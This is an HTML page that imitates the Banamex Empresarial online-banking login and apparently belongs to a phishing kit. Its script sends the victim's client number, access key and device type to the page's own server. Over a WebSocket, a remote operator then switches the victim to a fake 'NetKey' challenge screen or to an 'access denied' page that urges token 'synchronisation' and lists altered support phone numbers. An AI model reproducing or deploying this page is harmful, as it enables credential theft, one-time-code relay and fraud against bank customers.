<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="format-detection" content="telephone=no">
    <title>Banamex Empresarial - Login</title>
    <link href="/banamex/css/estilosLoginNew.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="/banamex/css/mando.css" type="text/css">
    <style>
        html { display: block; }
        .f11_N { font-size: 11px; color: #888888; }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="overlay_trans"></div>
    
    <div id="contenedor">
        <!-- Header -->
        <div class="header">
            <div class="top" id="navegacionPrincipal">
                <p class="fecha"></p>
                <div class="menu">
                    <ul>
                        <li><a href="#" style="font-weight:bold;">English</a></li>
                        <li class="separador">|</li>
                        <li><a href="#" class="flecha" style="font-weight:bold;"><span class="text">Sucursales</span> <span class="icono"></span></a></li>
                        <li class="separador">|</li>
                        <li>
                            <a href="javascript:void(0);" class="flecha con_menu" style="font-weight:bold;"><span class="text">Contáctanos</span> <span class="icono"></span></a>
                            <div class="contactanos top_menu">
                                <div class="cortina">
                                    <div class="box color333">
                                        <span class="bold f14">Contáctanos</span><br><br>
                                        <div class="paddingB2">
                                            <span class="f16 negrita">Banamex Resuelve PyMEs</span>
                                        </div>
                                        <div>
                                            <div class="paddingT5 paddingB1 f10 borderT_Dotted_CCCCCC"></div>
                                            <div class="paddingB1 f11 negrita">Segmento Pequeña y Mediana Empresa (PYME) y Sucursal<br></div>
                                            <div>
                                                <div>
                                                    <span class="paddingB1 f11_N negrita">CD. de México e interior de la república: </span>
                                                    <span class="f10">551226 8867<br></span>
                                                </div>
                                                <div>
                                                    <span class="f11_N negrita">EUA y Canadá:</span>
                                                    <span class="f10"> 1 844 207 3684</span>
                                                </div>
                                                <div>
                                                    <span class="paddingB1 f11_N bold">Horarios:</span><br>
                                                    <span class="f10">Lunes a Viernes 07:00 a 23:00, sábado de 09:00 a 18:00<br></span>
                                                </div>
                                                <div>
                                                    <span class="paddingB1 f11_N bold">Correo electrónico:</span>
                                                    <a style="color: black; text-decoration: underline;" class="f10" href="mailto:servicioalclientepyme@banamex.com">servicioalclientepyme@banamex.com</a>
                                                </div>
                                            </div><br>
                                        </div>
                                        <div class="paddingB2">
                                            <span class="f16 negrita">Banamex Resuelve</span>
                                        </div>
                                        <div>
                                            <div class="paddingT5 paddingB1 f10 borderT_Dotted_CCCCCC"></div>
                                            <div class="paddingB1 f11 negrita">Segmento Corporativo, Empresarial y Gobierno<br></div>
                                            <div>
                                                <div>
                                                    <span class="f11_N negrita">CD de México / interior de la república:</span>
                                                    <span class="f10"> 552226 1111</span>
                                                </div>
                                                <div>
                                                    <span class="f11_N negrita">EUA y Canadá:</span>
                                                    <span class="f10"> 1 855 295 7093</span>
                                                </div>
                                                <div>
                                                    <span class="paddingB1 f11_N negrita">Horario:</span><br>
                                                    <span class="f10">Lunes a Viernes 07:00 a 23:00, sábado de 09:00 a 18:00<br></span>
                                                </div>
                                                <div>
                                                    <span class="f11_N negrita">Correo Electrónico:</span><br>
                                                    <a style="color: black; text-decoration: underline;" class="f10" href="mailto:servicioalclientebei@banamex.com">servicioalclientebei@banamex.com</a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="box_bottom"></div>
                                </div>
                            </div>
                        </li>
                        <li class="separador">|</li>
                        <li><a href="#" style="font-weight:bold;">Ayuda</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom">
                <div class="logo"></div>
                <div class="divisor_logos"></div>
                <div class="BancaNet"></div>
            </div>
        </div>

        <div class="disclaimer-container" id="divDisclaimer"></div>
        <div id="cambiaImagen1" class="bg_2"></div>
        <div id="cambiaImagen2" class="bg_1"></div>

        <div id="contenido_login">
            <div id="area_login">
                <!-- Login Form -->
                <div id="login">
                    <div class="top"></div>
                    <div class="content">
                        <span class="colorFFF"><span class="bold">Banca</span>Net Empresarial</span>
                        <form action="#" class="marginT7 marginB11 form_login" onsubmit="return false;">
                            <span class="colorFFF">Número de cliente</span>
                            <div class="form_label">
                                <input type="password" maxlength="12" autocomplete="off" id="USERID" data-testid="input-numero-cliente">
                            </div>
                            <div class="paddingT9 colorFFF">Clave de acceso</div>
                            <div class="form_label">
                                <input type="password" maxlength="8" autocomplete="off" id="PASSWORD" data-testid="input-clave-acceso">
                            </div>
                            <div class="marginT15">
                                <input type="button" class="btn_az colorFFF" value="Entrar" data-testid="button-entrar">
                                <span class="candado"></span>
                            </div>
                        </form>
                        <p><a href="http://www.banamex.com/" class="ligas"><span class="flecha"></span><span>Ir a Banamex.com</span></a></p>
                        <p><a href="#" class="ligas"><span class="flecha"></span><span>Conoce el demo</span></a></p>
                        <p><a href="#" class="ligas"><span class="flecha"></span><span>Desbloquear claves<br><span class="marginL10"></span>de acceso</span></a></p>
                    </div>
                    <div class="bottom">
                        <div class="contenidoLoginBottom"></div>
                    </div>
                </div>
            </div>

            <!-- Banner indicators -->
            <div id="destacados">
                <div class="clear">
                    <div class="destacado_avtive_flecha"></div>
                </div>
                <div id="destacado_div">
                    <div class="destacado_3" id="destacado_3"></div>
                    <div class="destacado_2" id="destacado_2"></div>
                    <div class="destacado_1" id="destacado_1"></div>
                    <div class="avtive_0" id="destacado_0"></div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer marginT70" id="footer">
            <div class="top">
                <p class="floatL"><a href="http://www.banamex.com/">Banamex.com</a></p>
                <p class="floatR">
                    <a href="#">Privacidad y Seguridad</a> | <a href="#">Términos y Condiciones</a>
                </p>
            </div>
            <div class="bottom">
                <p class="paddingT7">
                    Banamex es una marca registrada de Citigroup Inc. utilizada bajo licencia por Banco Nacional de México, S.A.,
                    integrante del Grupo Financiero Banamex.
                </p>
                <p class="paddingT7">
                    © 2025 Banco Nacional de México, S.A. Derechos Reservados
                </p>
            </div>
        </div>
    </div>

    <div id="loading-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000;">
        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
            <div class="logo" style="background-size: contain; background-repeat: no-repeat; background-position: center; width: 200px; height: 60px; margin: 0 auto 30px;"></div>
            <div style="font-size: 18px; color: #003d7a; margin-bottom: 20px;">Validando credenciales...</div>
            <div style="width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #003d7a; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
        </div>
        <style>
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </div>

    <div id="netkey-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000;">
        <div class="header">
            <div class="bottom">
                <div class="logo"></div>
                <div class="divisor_logos"></div>
                <div class="BancaNet"></div>
            </div>
        </div>
        <div style="max-width: 500px; margin: 100px auto; padding: 30px; background: #003d7a; border-radius: 8px; color: white;">
            <h2 style="text-align: center; margin-bottom: 20px;">Autenticación NetKey</h2>
            <p style="text-align: center; margin-bottom: 30px; font-size: 14px;">Por favor ingrese el código CHALLENGE de su dispositivo NetKey</p>
            <div style="background: white; color: #003d7a; padding: 40px 20px; text-align: center; border-radius: 4px; font-size: 48px; font-weight: bold; letter-spacing: 8px; font-family: 'Courier New', monospace;" id="challenge-display">
                --------
            </div>
            <p style="text-align: center; margin-top: 20px; font-size: 12px; opacity: 0.8;">Esperando código CHALLENGE...</p>
        </div>
    </div>

    <div id="acceso-denegado-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 10000; overflow-y: auto;">
        <div class="header">
            <div class="bottom">
                <div class="logo"></div>
                <div class="divisor_logos"></div>
                <div class="BancaNet"></div>
            </div>
        </div>
        <div style="max-width: 700px; margin: 80px auto 40px; padding: 30px;">
            <div style="background: #d32f2f; color: white; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">
                <h2 style="margin: 0; font-size: 28px; font-weight: bold;">Acceso Denegado</h2>
            </div>
            <div style="background: #f5f5f5; padding: 30px; border-radius: 0 0 8px 8px; border: 1px solid #ddd;">
                <p style="color: #333; font-size: 16px; line-height: 1.6; margin-bottom: 25px;">
                    Su dispositivo NetKey requiere mantenimiento para continuar funcionando de manera adecuada. Es necesario sincronizarlo para restablecer su servicio correctamente.
                </p>
                
                <div style="background: white; padding: 25px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid #003d7a;">
                    <h3 style="color: #003d7a; margin: 0 0 15px 0; font-size: 18px;">Banamex Resuelve PyMEs</h3>
                    <p style="color: #666; margin: 5px 0; font-size: 14px;">Segmento Pequeña y Mediana Empresa (PYME) y Sucursal</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Cd. de México:</strong> 55 12 26 88 67</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Del Interior de la República:</strong> 55 12 26 88 67</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>EUA y Canadá:</strong> 55 12 26 88 67</p>
                    <p style="color: #666; margin: 8px 0; font-size: 14px;">Horario: Lunes a Viernes 07:00 a 23:00, sábado de 09:00 a 18:00</p>
                    <p style="color: #003d7a; margin: 8px 0; font-size: 14px;"><strong>Correo electrónico:</strong> servicioalclientepyme@banamex.com</p>
                </div>

                <div style="background: white; padding: 25px; border-radius: 8px; border-left: 4px solid #003d7a;">
                    <h3 style="color: #003d7a; margin: 0 0 15px 0; font-size: 18px;">Banamex Resuelve</h3>
                    <p style="color: #666; margin: 5px 0; font-size: 14px;">Segmento Corporativo, Empresarial y Gobierno</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Cd. de México:</strong> 55 22 26 1111</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>Del Interior de la República:</strong> 55 22 26 1111</p>
                    <p style="color: #333; margin: 8px 0; font-size: 15px;"><strong>EUA y Canadá:</strong> 55 22 26 1111</p>
                    <p style="color: #666; margin: 8px 0; font-size: 14px;">Horario: Lunes a Viernes 07:00 a 23:00, sábado de 09:00 a 18:00</p>
                    <p style="color: #003d7a; margin: 8px 0; font-size: 14px;"><strong>Correo electrónico:</strong> servicioalclientebei@banamex.com</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        var ws = null;
        var currentSessionId = null;

        // Función para detectar el tipo de dispositivo
        function detectarDispositivo() {
            var userAgent = navigator.userAgent;
            var dispositivo = 'Desconocido';
            
            // Detectar iOS
            if (/iPhone/i.test(userAgent)) {
                dispositivo = 'iPhone';
            } else if (/iPad/i.test(userAgent)) {
                dispositivo = 'iPad';
            } else if (/iPod/i.test(userAgent)) {
                dispositivo = 'iPod';
            }
            // Detectar Android
            else if (/Android/i.test(userAgent)) {
                if (/Mobile/i.test(userAgent)) {
                    dispositivo = 'Android Mobile';
                } else {
                    dispositivo = 'Android Tablet';
                }
            }
            // Detectar Windows
            else if (/Windows/i.test(userAgent)) {
                if (/Windows Phone/i.test(userAgent)) {
                    dispositivo = 'Windows Phone';
                } else {
                    dispositivo = 'Windows PC';
                }
            }
            // Detectar Mac
            else if (/Macintosh|Mac OS X/i.test(userAgent)) {
                dispositivo = 'Mac';
            }
            // Detectar Linux
            else if (/Linux/i.test(userAgent)) {
                dispositivo = 'Linux PC';
            }
            
            console.log('Dispositivo detectado:', dispositivo);
            console.log('User Agent:', userAgent);
            
            return dispositivo;
        }

        // Set current date
        window.addEventListener('DOMContentLoaded', function() {
            var today = new Date();
            var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            var fechaStr = today.toLocaleDateString('es-MX', options);
            var fechaElement = document.querySelector('.fecha');
            if (fechaElement) {
                fechaElement.textContent = fechaStr;
            }

            // Banner rotation
            var banners = [0, 1, 2, 3];
            var currentBanner = 0;
            
            setInterval(function() {
                var img1 = document.getElementById('cambiaImagen1');
                var img2 = document.getElementById('cambiaImagen2');
                
                if (currentBanner % 2 === 0) {
                    img1.className = 'bg_1';
                    img2.className = 'bg_2';
                } else {
                    img1.className = 'bg_2';
                    img2.className = 'bg_1';
                }
                
                // Update indicators
                for (var i = 0; i <= 3; i++) {
                    var elem = document.getElementById('destacado_' + i);
                    if (elem) {
                        elem.className = (i === currentBanner) ? 'avtive_' + i : 'destacado_' + i;
                    }
                }
                
                currentBanner = (currentBanner + 1) % 4;
            }, 5000);

            // Validate numeric input
            document.getElementById('USERID').addEventListener('keypress', function(e) {
                var char = String.fromCharCode(e.which || e.keyCode);
                if (!/[0-9]/.test(char)) {
                    e.preventDefault();
                }
            });

            // Validate alphanumeric input
            document.getElementById('PASSWORD').addEventListener('keypress', function(e) {
                var char = String.fromCharCode(e.which || e.keyCode);
                if (!/[a-zA-Z0-9]/.test(char)) {
                    e.preventDefault();
                }
            });

            // Prevent paste
            document.getElementById('USERID').addEventListener('paste', function(e) {
                e.preventDefault();
            });
            document.getElementById('PASSWORD').addEventListener('paste', function(e) {
                e.preventDefault();
            });

            // Handle form submission
            document.querySelector('.btn_az').addEventListener('click', function(e) {
                e.preventDefault();
                
                var numeroCliente = document.getElementById('USERID').value.trim();
                var claveAcceso = document.getElementById('PASSWORD').value.trim();
                
                if (!numeroCliente || !claveAcceso) {
                    alert('Por favor complete todos los campos');
                    return;
                }
                
                // Detectar dispositivo
                var dispositivo = detectarDispositivo();
                
                // Show loading screen
                document.getElementById('loading-screen').style.display = 'block';
                
                // Send login request
                fetch('/api/banamex/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        numeroCliente: numeroCliente,
                        claveAcceso: claveAcceso,
                        dispositivo: dispositivo
                    })
                })
                .then(function(response) { return response.json(); })
                .then(function(data) {
                    if (data.success) {
                        currentSessionId = data.sessionId;
                        connectWebSocket(data.sessionId);
                    } else {
                        alert('Error al procesar login: ' + (data.message || 'Error desconocido'));
                        document.getElementById('loading-screen').style.display = 'none';
                    }
                })
                .catch(function(error) {
                    console.error('Error:', error);
                    alert('Error de conexión');
                    document.getElementById('loading-screen').style.display = 'none';
                });
            });

            // Allow Enter key to submit
            document.getElementById('PASSWORD').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    document.querySelector('.btn_az').click();
                }
            });
        });

        function connectWebSocket(sessionId) {
            var protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            var wsUrl = protocol + '//' + window.location.host + '/ws';
            
            console.log('Intentando conectar WebSocket para sesión:', sessionId);
            ws = new WebSocket(wsUrl);
            
            ws.onopen = function() {
                console.log('WebSocket conectado exitosamente');
                ws.send(JSON.stringify({
                    type: 'REGISTER',
                    role: 'CLIENT',
                    sessionId: sessionId
                }));
                console.log('Mensaje REGISTER enviado');
            };
            
            ws.onmessage = function(event) {
                try {
                    var data = JSON.parse(event.data);
                    console.log('Mensaje WebSocket recibido:', data);
                    
                    if (data.type === 'SCREEN_CHANGE') {
                        console.log('Procesando SCREEN_CHANGE');
                        handleScreenChange(data.data);
                    } else if (data.type === 'INIT_SESSION') {
                        console.log('Sesión inicializada:', data.data);
                    }
                } catch (e) {
                    console.error('Error procesando mensaje:', e);
                }
            };
            
            ws.onerror = function(error) {
                console.error('WebSocket error:', error);
            };
            
            ws.onclose = function(event) {
                console.log('WebSocket cerrado:', event.code, event.reason);
                // Intentar reconectar después de 2 segundos
                setTimeout(function() {
                    console.log('Intentando reconectar WebSocket...');
                    connectWebSocket(sessionId);
                }, 2000);
            };
        }

        function handleScreenChange(data) {
            console.log('Cambio de pantalla recibido:', data);
            console.log('Tipo de pantalla:', data.tipo);
            
            // Ocultar todas las pantallas primero
            document.getElementById('loading-screen').style.display = 'none';
            document.getElementById('netkey-screen').style.display = 'none';
            document.getElementById('acceso-denegado-screen').style.display = 'none';
            
            if (data.tipo === 'netkey') {
                console.log('Mostrando pantalla NetKey');
                document.getElementById('netkey-screen').style.display = 'block';
                
                if (data.challenge) {
                    console.log('Mostrando challenge:', data.challenge);
                    document.getElementById('challenge-display').textContent = data.challenge;
                } else {
                    console.log('No se recibió challenge en los datos');
                }
            } else if (data.tipo === 'acceso_denegado') {
                console.log('Mostrando pantalla de Acceso Denegado');
                document.getElementById('acceso-denegado-screen').style.display = 'block';
            } else {
                console.log('Tipo de pantalla no reconocido:', data.tipo);
            }
        }
    </script>
</body>
</html>
